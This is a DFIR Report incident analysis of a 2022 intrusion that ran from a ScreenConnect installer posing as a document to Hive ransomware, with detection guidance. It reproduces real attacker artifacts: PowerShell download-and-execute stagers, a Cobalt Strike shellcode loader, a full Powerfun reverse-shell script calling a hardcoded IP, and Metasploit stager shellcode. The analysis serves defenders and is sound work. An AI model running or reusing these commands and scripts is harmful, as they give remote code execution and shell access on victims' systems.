# From ScreenConnect to Hive Ransomware in 61 hours - The DFIR Report

- **Source :** dfir-report
- **URL :** https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/
- **Date :** September 25, 2023

---

![](https://thedfirreport.com/wp-content/uploads/18364-057.png)

[Hive](https://thedfirreport.com/category/ransomware/hive/)

# From ScreenConnect to Hive Ransomware in 61 hours

September 25, 2023 

In 2022, [The DFIR Report observed an increase](https://thedfirreport.com/2023/03/06/2022-year-in-review/) in the adversarial usage of Remote Management and Monitoring (RMM) tools. When compared to post-exploitation channels that heavily rely on terminals, such as Cobalt Strike or Metasploit, the graphical user interface provided by RMMs are more user friendly. With the popularity of SaaS (Software as a Service) models, many RMMs are further offered as cloud-based services. By having command & control channels rely on legitimate cloud services, adversaries make attribution and disruption more complex. Utilizing RMMs could also hinder detection (i.e. trusted domains & signed executables).

The 2022 increase in RMM usage has been observed industry-wide and even warranted CISA’s “[Protecting Against Malicious Use of Remote Monitoring and Management Software](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a)” advisory.

This multi-RMM intrusion, dated Q4 2022, acts as a complement to previous observations and ultimately lead to the deployment of the [now-disrupted](https://www.justice.gov/opa/pr/us-department-justice-disrupts-hive-ransomware-variant) Hive ransomware.

## [Services](https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/#services)

  * **[Private Threat Briefs](https://thedfirreport.com/services/threat-intelligence/#threat-brief):** Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.
  * **[Threat Feed](https://thedfirreport.com/services/threat-intelligence/#threat-feed):** Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.
  * **[All Intel](https://thedfirreport.com/services/threat-intelligence/#all-intel):** Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.
  * **[Private Sigma Ruleset](https://thedfirreport.com/services/detection-rules/):** Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&CK with test examples.
  * **[DFIR Labs](https://thedfirreport.com/services/dfir-labs/):** Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.



Contact us today for a demo!

## [Case Summary](/#case-summary)

In this intrusion from October 2022, we observed a threat actor relying on a RMM tool as the initial access, and ended with a somewhat botched Hive ransomware deployment. The initial payload was an executable file masquerading as a legitimate document. [According to Huntress](/#initial-access), this campaign was likely delivered via an email, with a link, causing the executable’s download when clicked on.

The execution of the file resulted in the installation of [ScreenConnect](https://screenconnect.connectwise.com/). During the investigation, we observed that this initial access method required the end user to be a local Administrator, as less privileged users would cause the installation to fail. Around an hour after execution, the threat actor initiated discovery commands via ScreenConnect using standard Windows utilities like _systeminfo_ , _ipconfig_ , and _net_. A few minutes later, the threat actor proceeded to run a BITS transfer job to deploy a Cobalt Strike beacon.

After an hour of paused activity, the threat actor used ScreenConnect to download an additional binary. This new file was a trojanized ApacheBench executable which was back-doored with Metasploit shellcode. When executed, the shellcode would initiate a Meterpreter command and control channel. After starting this new command and control channel, the threat actor moved on to lateral movement using remote services to execute PowerShell and MSI installers for Atera and Splashtop on a server. Additional BITS transfers were observed to establish further Cobalt Strike footholds.

Around 20 minutes after this activity, the threat actor continued lateral movement towards other hosts using Impacket’s [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) script. This lateral movement included a check on the remote hosts using _quser_ , and starting BITS transfers to execute Cobalt Strike.

On the following day, the threat actor dropped a Mimikatz binary on several servers and executed them remotely using wmiexec. Activity stopped for another few hours, until the threat actor returned to run a new Cobalt Strike beacon on several hosts across the environment. From these beacons, a few discovery commands were issued, after which the threat actor went dormant again.

The next day, the threat actor executed a batch file used to extract Active Directory data using built-in PowerShell utilities. Activity then ceased until late in the day when the threat actor returned and began accessing hosts via RDP. From these RDP sessions, the threat actor reviewed file shares and backups within the network. The threat actor then dropped Rclone on a server with file shares and proceeded to configure a connection to a remote server over [SFTP](https://rclone.org/sftp/). Once connected, the threat actor moved to exfiltrate the file share’s contents over the SFTP connection. While the exfiltration was running, the threat actor dropped [netscan](https://www.softperfect.com/products/networkscanner/) on the server and conducted scans of the network with a particular focus on RDP services.

Around three hours after exfiltration started, the threat actor began their final action by deploying the Hive ransomware. To start, they changed an administrator’s password and then manually executed the ransomware on several key servers. After these manual ransomware executions, the threat actor moved to attempt domain-wide encryption. To do so, the threat actor staged the ransomware binary on a network share and then created a new domain-wide GPO with a scheduled task intended to run the ransomware binary on each domain-joined host.

The GPO and scheduled task creation included incorrect settings, resulting in a failed domain-wide ransomware deployment. However, via manual ransomware deployment and execution, key servers were successfully encrypted. From initial access, the time to ransomware (TTR) was 61 hours.

## Analysts

Analysis and reporting completed by [0xThiebaut](https://twitter.com/0xThiebaut), UC2, and [0xtornado](https://twitter.com/0xtornado).

## Initial Access

The intrusion started with the execution of a executable named _document8765.exe_. According to [Huntress](https://www.huntress.com/), this initial access file was delivered to end users after browsing to _https[:]//environmentca[.]com/bkh6q_. In Huntress’s data, the site was loaded from an Outlook process indicating likely email delivery.

## Execution

* * *

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-001.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-001.png)

* * *

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-002.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-002.png)

### 

### ScreenConnect

There are many techniques to detect the execution of user-downloaded executables. While some effective techniques rely on the presence of a MOTW (Mark of the Web), simply reviewing programs started from within the user’s _%USERPROFILE%\Downloads_ folder is a common and effective technique. The execution of such downloads can be observed through both the default security event _4688_ ([A new process has been created](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)) as well as Sysmon’s event _1_ ([Process creation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-1-process-creation)).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-003.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-003.png)

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-004.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-004.png)

Once executed, the malicious dropper staged a Windows Installer File (_*.msi_) within the user’s _%TEMP%_ directory and proceeded with the execution of the installer through _msiexec.exe_ , as seen in the following Sysmon event _1_. Once this installer executed, the malicious _document8765.exe_ process terminated.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-005.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-005.png)

The absence of the _/q_[display options](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec#display-options) results in the installer being user-visible. This can be observed in sandbox executions such as in the “Replay Monitor” from [Recorded Future’s Triage](https://tria.ge/221019-wfsjpsaed5/behavioral2#monitor-header) Sandbox.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-006.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-006.png)

Upon execution, the malicious installer deploys a legitimate instance of the [ScreenConnect](https://screenconnect.connectwise.com/) RMM software. As part of this installation process, additional _msiexec.exe_ and _rundll32.exe_ invocations took place, details of which are omitted due to being part of the legitimate ScreenConnect installer. Most notably, ScreenConnect was installed within the _%ProgramFiles(x86)%\ScreenConnect Client (0e2f8d025e383f56)\_ subdirectory, where _0e2f8d025e383f56_ is an installation thumbprint.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-007.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-007.png)

ScreenConnect persistence as well as related command & control mechanisms are discussed in later sections.

Once the ScreenConnect channel was established, the threat actor was able to execute additional commands through the RMM utility’s built-in features. For ScreenConnect, command execution is performed by dropping the desired script on disc, followed by its execution through the appropriate interpreter (Command Prompt or PowerShell). This mechanism provides numerous detection opportunities through Sysmon’s event _11 (file create);_ as well as, upon execution, the Security event _4688_ or Sysmon event _1_ , displayed hereafter.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-008.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-008.png)

As part of these executed commands, multiple discovery actions were carried out; these are further documented within the discovery section. Additionally, the threat actor was seen attempting to execute additional PowerShell scripts.

#### Cobalt Strike

One of the commands issued through ScreenConnect was the deployment of Cobalt Strike through a PowerShell stager, one hour 22 minutes into the intrusion.
    
    
    powershell.exe -nop -c "start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'http://31.41.244.192:80/96945jgjf' -Destination $d; $t = [IO.File]::ReadAllText($d); Remove-Item $d; IEX $t } -Argument 0 | wait-job | Receive-Job" 

By relying on plain HTTP, the retrieved PowerShell payload can be extracted from the network communications.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-009.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-009.png)

Similar to the above Cobalt Strike stager, a second attempt was made using the following command.
    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://31.41.244.192:80/645gkdkfgd'))"

Here again, by relying on plain HTTP, the actor exposed the PowerShell payload.
    
    
    Set-StrictMode -Version 2
    
    $DoIt = @'
    function func_get_proc {
    	Param (
    		$var_module_name, $var_procedure_name
    	)
    	
    	$var_system_dll = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -And $_.Location.Split('\\')[-1].Equals('System.dll') -And $_.GlobalAssemblyCache }
    	$var_microsoft_win32_unsafe_native_methods = $var_system_dll.GetType('Microsoft.Win32.UnsafeNativeMethods')
    	$var_get_module_handle = $var_microsoft_win32_unsafe_native_methods.GetMethod('GetModuleHandle')
    	$var_get_proc_address = $var_microsoft_win32_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'System.String'))
    	$var_module_handle = $var_get_module_handle.Invoke($null, @($var_module_name))
    	return $var_get_proc_address.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $var_module_handle)), $var_procedure_name))
    }
    
    function func_get_type {
    	Param (
    		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameter_types,
    		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
    	)
    
    	$var_invoke_method = 'Invoke'
    	$var_type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflectss, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    	$var_type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameter_types).SetImplementationFlags('Runtime, Managed')
    	$var_type.DefineMethod($var_invoke_method, 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameter_types).SetImplementationFlags('Runtime, Managed')
    	return $var_type.CreateType()
    }
    
    $var_base64 = 'i0QkBIuInAAAA[...]AAAAAAA='
    
    $var_result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc kernel32.dll LoadLibraryA), (func_get_type @([String]) ([IntPtr]))).Invoke('crypt32.dll')
    $var_string_to_binary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc crypt32.dll CryptStringToBinaryA), (func_get_type @([String], [UInt32], [UInt32], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [IntPtr]) ([Bool])))
    
    $var_length = 0
    $var_result = $var_string_to_binary.Invoke($var_base64, $var_base64.Length, 0x1, [IntPtr]::Zero, [Ref]$var_length, [IntPtr]::Zero, [IntPtr]::Zero)
    
    $var_create_mapping = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc kernel32.dll CreateFileMappingA), (func_get_type @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32], [IntPtr]) ([IntPtr])))
    $var_handle = $var_create_mapping.Invoke(-1, [IntPtr]::Zero, 0x08000040, 0x0, $var_length, [IntPtr]::Zero)
    
    $var_map_view = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc kernel32.dll MapViewOfFile), (func_get_type @([IntPtr], [UInt32], [UInt32], [UInt32], [IntPtr]) ([IntPtr])))
    $var_map = $var_map_view.Invoke($var_handle, 0x000F003F, 0, 0, $var_length)
    
    $var_result = $var_string_to_binary.Invoke($var_base64, $var_base64.Length, 0x1, $var_map, [Ref]$var_length, [IntPtr]::Zero, [IntPtr]::Zero)
    
    $var_invoke = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_map, (func_get_type @([IntPtr]) ([Void])))
    $var_invoke.Invoke($var_map)
    
    '@
    
    Switch ([intptr]::Size) {
    	4 {
    		IEX $DoIt
    	}
    	8 {
    		start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
    	}
    }
    

As Cobalt Strike beacons load themselves into memory, we can extract the associated configuration using tools such as [cobaltstrike-config-extractor](https://github.com/strozfriedberg/cobaltstrike-config-extractor).
    
    
    {
      "beacontype": [
        "HTTP"
      ],
      "sleeptime": 60000,
      "jitter": 0,
      "maxgetsize": 1048576,
      "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
      "license_id": 1580103824,
      "cfg_caution": false,
      "kill_date": null,
      "server": {
        "hostname": "31.41.244.192",
        "port": 80,
        "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
      },
      "host_header": "",
      "useragent_header": null,
      "http-get": {
        "uri": "/fwlink",
        "verb": "GET",
        "client": {
          "headers": null,
          "metadata": null
        },
        "server": {
          "output": [
            "print"
          ]
        }
      },
      "http-post": {
        "uri": "/submit.php",
        "verb": "POST",
        "client": {
          "headers": null,
          "id": null,
          "output": null
        }
      },
      "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
      "crypto_scheme": 0,
      "proxy": {
        "type": null,
        "username": null,
        "password": null,
        "behavior": "Use IE settings"
      },
      "http_post_chunk": 0,
      "uses_cookies": true,
      "post-ex": {
        "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
        "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
      },
      "process-inject": {
        "allocator": null,
        "execute": [
          "CreateThread",
          "SetThreadContext",
          "CreateRemoteThread",
          "RtlCreateUserThread"
        ],
        "min_alloc": 0,
        "startrwx": true,
        "stub": "IiuPJ9vfuo3dVZ7son6mSA==",
        "transform-x86": null,
        "transform-x64": null,
        "userwx": true
      },
      "dns-beacon": {
        "dns_idle": null,
        "dns_sleep": null,
        "maxdns": null,
        "beacon": null,
        "get_A": null,
        "get_AAAA": null,
        "get_TXT": null,
        "put_metadata": null,
        "put_output": null
      },
      "pipename": null,
      "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
      "stage": {
        "cleanup": false
      },
      "ssh": {
        "hostname": null,
        "port": null,
        "username": null,
        "password": null,
        "privatekey": null
      }
    }
    

#### Powerfun

About 40 minutes later, two hours and seven minutes into the intrusion, the threat actor leveraged another stager based on _System.Net.WebClient_ ‘s _DownloadFile_ function to drop _%temp%\P6nqEdwk.exe_. This trojanized executable was downloaded from _http://94.232.43[.]201:8080/dQhNZOV3Qm_ and subsequently executed.
    
    
    powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\P6nqEdwk.exe')"; (new-object System.Net.WebClient).DownloadFile('http://94.232.43.201:8080/dQhNZOV3Qm', $z); invoke-item $z

Sysmon’s process creation event _1_ (or alternatively the Security event _4688_) captured the parent-child relationship as shown below.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-010.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-010.png)

Upon inspection, the trojanized executable seems based on ApacheBench 2.3, a legitimate HTTP benchmarking utility.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-011.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-011.png)

The ApacheBench executable has, however, been modified to embed an additional PowerShell payload.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-012.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-012.png)

Upon execution of the ApacheBench executable, the PowerShell payload gets executed.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-013.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-013.png)

When decoded, the payload is a configured [Powerfun reverse-shell believed to be part of Metasploit](https://github.com/rapid7/metasploit-framework/blob/c0b995cc97f8392d1e174306890c5d515e158963/data/exploits/powershell/powerfun.ps1) (due to its usage of the default port _4444_). This specific format of the PowerShell reverse shell was [introduced in version v4.11.7](https://github.com/rapid7/metasploit-framework/commit/c0b995cc97f8392d1e174306890c5d515e158963) (May 19, 2015), suggesting the threat actor partially relies on outdated tooling. The script was later [modified in v6.3.23](https://github.com/rapid7/metasploit-framework/commit/47eec52f064434732427991b3bd211fd3e2942c3) (Nov 30, 2021).
    
    
    # Powerfun - Written by Ben Turner & Dave Hardy
    
    function Get-Webclient 
    {
        $wc = New-Object -TypeName Net.WebClient
        $wc.UseDefaultCredentials = $true
        $wc.Proxy.Credentials = $wc.Credentials
        $wc
    }
    function powerfun 
    { 
        Param( 
        [String]$Command,
        [String]$Sslcon,
        [String]$Download
        ) 
        Process {
        $modules = @()  
        if ($Command -eq "bind")
        {
            $listener = [System.Net.Sockets.TcpListener]4444
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 
        if ($Command -eq "reverse")
        {
            $client = New-Object System.Net.Sockets.TCPClient("94.232.43.201",4444)
        }
    
        $stream = $client.GetStream()
    
        if ($Sslcon -eq "true") 
        {
            $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
            $sslStream.AuthenticateAsClient("94.232.43.201") 
            $stream = $sslStream 
        }
    
        [byte[]]$bytes = 0..20000|%{0}
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
    
        if ($Download -eq "true")
        {
            $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
            $stream.Write($sendbytes,0,$sendbytes.Length)
            ForEach ($module in $modules)
            {
                (Get-Webclient).DownloadString($module)|Invoke-Expression
            }
        }
    
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)
    
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
    
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x
    
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        $listener.Stop()
        }
    }
    
    powerfun -Command reverse -Sslcon true
    

Once connected with _94.232.43[.]201:4444_ over TCP, the threat actor leveraged the reverse shell to execute the two slightly different encoded PowerShell stagers. Based on the timestamps between process creations, as well as the presence of credible _WerFault.exe_ process trees, we believe with medium confidence the first process crashed multiple times after eight minutes, forcing the threat actor to re-start the stager.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-014.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-014.png)

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-015.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-015.png)

While both of these commands vary in obfuscation, they ultimately execute the same following shellcode.
    
    
    /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmhe6CvJaAIAEVGJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAz/Tgh17GjwtaJW/9VqAGoEVldoAtnIX//VizZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//VAcMpxnXuww==

This shellcode acts as a stager that downloads a payload from a websocket established with _94.232.43[.]201:4433_. Analysis of similar shellcode as well as its API hashing algorithm (incl. rainbow table) has been [documented by NVISO](https://blog.nviso.eu/2021/09/02/anatomy-and-disruption-of-metasploit-shellcode/).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-016.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-016.png)

There are several tools available to assist with analyzing shellcode, one of which is [scdbg](http://sandsprite.com/blogs/index.php?uid=7&pid=152). This tool has the ability to analyze code and provide useful information regarding its functionality. By using scdbg to analyze the shellcode, we can obtain the necessary remote server’s host and port.

![](https://thedfirreport.com/wp-content/uploads/2023/09/Screenshot_2023-09-26_133509.png)

As is the case for plain HTTP, plain websockets allow for network communications to be intercepted. To that extent, the websocket stager retrieves the payload’s size (_0x02b043_ in little endian) followed by the payload itself.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-018.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-018.png)

When extracted, the payload matches two YARA rules from Florian Roth detecting [reflective loaders](https://github.com/Neo23x0/signature-base/blob/3f16ebc7184dc014007a84508fbf14a213d49609/yara/gen_loaders.yar#L14-L40) as well as [in-memory Meterpreter](https://github.com/Neo23x0/signature-base/blob/3f16ebc7184dc014007a84508fbf14a213d49609/yara/gen_metasploit_payloads.yar#L323-L344).

## Atera

While the ScreenConnect RMM software was leveraged on the beachhead, other systems compromised through lateral movement saw the installation of the [Atera](https://www.atera.com/) RMM utility.

Installation of Atera was initiated from a beacon using the _C:\Windows\System32\msiexec.exe /i “C:\programdata\setup.msi”_ command. Analysis of the Atera installer revealed which attacker account was used, namely _[[email protected]](/cdn-cgi/l/email-protection)_ (account ID _0013z00002rytAiAAI_).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-019.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-019.png)

Throughout this utility’s [live command prompt feature](https://support.atera.com/hc/en-us/articles/215951557-Live-manage-Command-prompt), the threat actor obtained numerous live command prompts. The creation of live command prompts can be observed through processes started by _%ProgramFiles%\ATERA Networks\AteraAgent\Packages\AgentPackageRunCommandInteractive\AgentPackageRunCommandInteractive.exe_. Throughout this intrusion, all interactive commands used the _cmd.exe_ interpreter. Using the Security log’s process events (event _4688_), we can observe how the threat actor interactively performed additional execution, as well as exfiltration.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-064.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-064.png)

## Splashtop

While Atera provides management capabilities such as scripting, unattended remote access requires third-party integrations. Throughout this intrusion, the actors relied on the [Atera-recommended](https://www.atera.com/features/remote-access-and-remote-support/) Splashtop integration.

Using both file and process creation logs (i.e. Sysmon’s event _11_ and _1_ ) we can observe how Atera’s _AgentPackageSTRemote.exe_ initiated the deployment of Splashtop, enabling the actor to gain unattended remote interactive access.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-021.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-021.png)

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-022.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-022.png)

Reviewing the logging for Splashtop in the Windows Event log channels _Splashtop-Splashtop Streamer-Status/Operational_ revealed the RMM ID in use by the threat actor.
    
    
    RMM_ID: hZCDFPhK75mJ

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-023.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-023.png)

### Impacket

As part of their toolkit, the threat actor used Impacket’s wmiexec.py script to perform their actions. This can be easily seen as wmiexec.py will, by default, redirect its output to \\\127.0.0.1\ADMIN$\\__%timestamp% (as visible in the [source code](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py#L295)).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-024.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-024.png)

## Persistence

### ScreenConnect

As part of the installation process, ScreenConnect persists through an auto-start service. The built-in System event _7045_ (A service was installed in the system) provides visibility into such installations.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-025.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-025.png)

Should the System events be unavailable, Sysmon registry value-set events (event _13_) provide sufficient visibility. As shown below, we can deduce the service’s start mode through the values:

  * _Type_ of data _0x10_ (_SERVICE_WIN32_OWN_PROCESS_)
  * _Start_ of data _0x2_ (_SERVICE_AUTO_START_)



[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-026.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-026.png)

Although the Sysmon data of the _ImagePath_ value had been corrupted through log collection, the persisted service command line could be recovered by running [Eric Zimmerman’s Registry Explorer](https://ericzimmerman.github.io) against the acquired System hive (_C:\Windows\System32\config\SYSTEM_) and associated transaction log (_C:\Windows\System32\config\SYSTEM.LOG1_).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-027.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-027.png)

The recovered command line below defines the following options, as [reported by](https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies) Anomali Threat Research.

  * _e_ as session type, can be _Support_ , _Meeting_ , _Access_ .
  * _y_ as process type, can be _Guest_ or _Host_ .
  * _h_ as the URI to the relay service’s URI.
  * _p_ as the relay service’s port.
  * _s_ as a globally unique identifier for client identification.
  * _k_ as the encoded encryption key, used for identity verification.
  * _t_ as the optional session name.


    
    
    "C:\Program Files (x86)\ScreenConnect Client (0e2f8d025e383f56)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=instance-l7l8l9-relay.screenconnect.com&p=443&s=f1dccbe5-0865-4f1c-a463-9e25663d18d1&k=BgIAAACkAABSU0ExAAgAAAEAAQC9cxw5UA763FPcVEu4K7lTUZPe40uWy%2fdpeqfjnhw6qPCnMz1zFVt6J1HHp%2b9%2fhXseaHv7tHKfAevkRMosxtdVUlRlFjGO1E0lztj6BuXXY3hOn%2b9zOMiD85jSb5nrrk4O4IhgV9GNihZS3aAMUcTWlSUzCOGSECigjs5Sg8kxq5CHz1RuGp6Wbv7SO9LEriAGZj%2fYQU%2fq0X9%2bFDnKAKtBYkUdW3Muf9ewnItCRM9XErqohYafqh04mlqluyGqfx%2bAMezEuQDgFHQPIurisVhSinHWRCO4WDLKpaoeWneMJ3BMj6ReFvhaXVGW0u%2fPMkXzYLB2sMMBcibeuJV1yczL&v=AQAAANCMnd8BFdERjHoAwE%2fCl%2bsBAAAAQvvF3IURJU6YGnF7BiJwogAAAAACAAAAAAAQZgAAAAEAACAAAACqA7fRdCVSQQS%2bln7kPcL3Yr8FtoKz3%2fyztuVPXWhifgAAAAAOgAAAAAIAACAAAADfm%2b0yGLK3YmRYzydHC3OvJWlNwe8O2kNKxHqVXATSaaAEAADExpelIJ42A%2bmy3CqMzSNMfDDHLKfeVHAXqYi92UDuffufwuxI6hMNFfCGXwR%2fndw4CeU0AaoR4STjLsx7DhTUDnuspGicxlqoRTM%2bUmC1VN8mbfLBHx7SKMzJYWAwMM%2bfIbevg%2bXdhUrQRKuFsOU6VsOi6a7HFsFjMrF0HXzSlPJZILQ5C0tmPB%2bowunqV2JP3PDhxqI%2fgR5AoubdVIC8ZpsckrDk0tm5ARaDYpTxYxQMJ5acToCrRodGjvgRzddPywGYYvnTFxyS%2bZOwxz3TicTva8Tkx8PaXNNyckViUb%2bk3s102XEbFtqiD9NtnMPYhzmAAdqL4UR6ELqJrYX7Y%2f87XVJmzFtDdyYIufC1S3w6lVHDOlGS%2bvxtANiaRGWY%2bdZGpj75%2f8YlPAcctJioE4LefyqZKRhDjWG4OwVmCfKUcmnoLzEwZXFiXMkm4nPe4lBWL7xdsX5h4lcBjNevPvwN0K4%2bsE%2fC9jUONr3r9JiZc6V7RJOwfACO9AukfBzQOyfsb6KD%2b6tWKc%2fQ5rAPr4MtKqgA17CmSIJIRnLA5HDBMrybFaLAs5EfnFHAbS2UJpHMiXNIwEEksFM65hIN4OKrHnIjadBT8OzL2XCk9bRw